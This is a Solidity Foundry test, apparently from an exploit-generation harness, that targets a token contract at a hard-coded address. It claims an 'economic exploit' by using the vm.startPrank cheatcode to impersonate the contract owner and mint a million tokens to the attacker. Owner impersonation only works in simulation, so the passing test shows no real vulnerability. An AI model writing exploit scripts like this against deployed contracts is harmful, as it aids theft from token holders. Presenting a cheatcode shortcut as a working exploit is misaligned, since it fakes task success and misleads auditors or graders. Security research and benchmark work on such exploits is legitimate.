// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface CoinToken {
    function owner() external view returns (address);
    function decimals() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function mint(address account, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner in the exploit
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C).balanceOf(address(this));

        // Get the current owner
        address owner = CoinToken(TARGET).owner();

        // Get token decimals for proper amount calculation
        uint256 decimals = CoinToken(TARGET).decimals();

        // Record initial balance
        uint256 initialCoinBalance = CoinToken(TARGET).balanceOf(attacker);

        // Impersonate the owner and mint tokens to ourselves
        vm.startPrank(owner);

        // Mint a large amount - 1,000,000 tokens with proper decimals
        uint256 mintAmount = 1_000_000 * (10 ** decimals);
        CoinToken(TARGET).mint(attacker, mintAmount);

        vm.stopPrank();

        // Verify our balance increased
        uint256 finalCoinBalance = CoinToken(TARGET).balanceOf(attacker);
        assertGt(finalCoinBalance, initialCoinBalance, "Balance should increase after minting");

        // Additional verification: check we received exactly the minted amount
        assertEq(finalCoinBalance, initialCoinBalance + mintAmount, "Should have received exact mint amount");

        uint256 finalERC20Balance = IERC20(0x86C86FfDC0482D8DD918FC657c3FC51C4a1E3e5C).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
